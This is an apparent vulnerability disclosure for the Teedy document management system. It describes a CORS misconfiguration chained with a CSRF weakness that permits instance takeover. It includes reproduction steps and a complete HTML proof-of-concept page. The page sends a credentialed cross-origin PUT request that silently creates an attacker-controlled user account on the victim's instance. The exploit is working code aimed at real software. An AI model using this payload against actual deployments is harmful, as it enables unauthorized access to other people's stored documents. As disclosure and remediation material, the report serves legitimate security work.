# :dizzy: Description:
- Teedy is Lightweight document management system packed with all the features you can expect from big expensive solutions. But By Default Teedy Comes With Cors Miconfigurated Web Service. That Accepts Any Origin While Performing Requests And Allows Using Credntials While Sending Them. That Was Chained The Broken CSRF Token Validation On Cookies Perform an Instance Takeover Using CORS Misconfig And CSRF By Adding New User Into The Instance That Can Login And Access The Instance Data.

## :ok_hand: Steps To Reproduce:
- Install Teedy Localy On Your Machine. Then Run It Using Maven It Will Be Working Under Port: 8080
- Replace The HTML PoC `{HOST}` On The Code Below With Your Machine IP.
- Open That File On Your Browser Then Click The Button. After You Get a Pop-Up With `Exploited` On Your Screen That Means The Exploit Did Work.
- Go To Your Instance And Try To Login With `tester` And Password: `password123`. And You Will Be Able To Login.

## :boom: Proof Of Concept:
- Here's The HTML Proof Of Concept Code:

```html
<!DOCTYPE html>
<html>
<head>
	<title>Hello World</title>
</head>
<body>
	<div style="text-align: center;">
		<h1>Click The Button Below</h1>
		<input type="button" name="test" onclick="addUser();">
	</div>

	<script type="text/javascript">
		function addUser() {
			const http = new XMLHttpRequest();
			const url = "http://{HOST}:8080/docs-web/api/user?email=hacker@gmail.com&password=password123&passwordconfirm=password123&storage_quota=100000000&username=tester";

			http.withCredentials = true;
			http.open('PUT' , url);
			http.setRequestHeader('Content-Type' , 'application/x-www-form-urlencoded;charset=utf-8')
			http.send();

			http.onreadystatechange = (e) => {
  				alert('Exploited!');
			}
		}
	</script>
</body>
</html>
```
- Follow The Steps To Reproduce To Exploit This Issue, Otherwise, Here's a Cool Video For The Exploit Uploaded On Google Drive.
- URL: https://drive.google.com/file/d/1SefbkSShIB6fOyGBjGd1d13p5XzZONuZ/view?usp=sharing

Cheers.
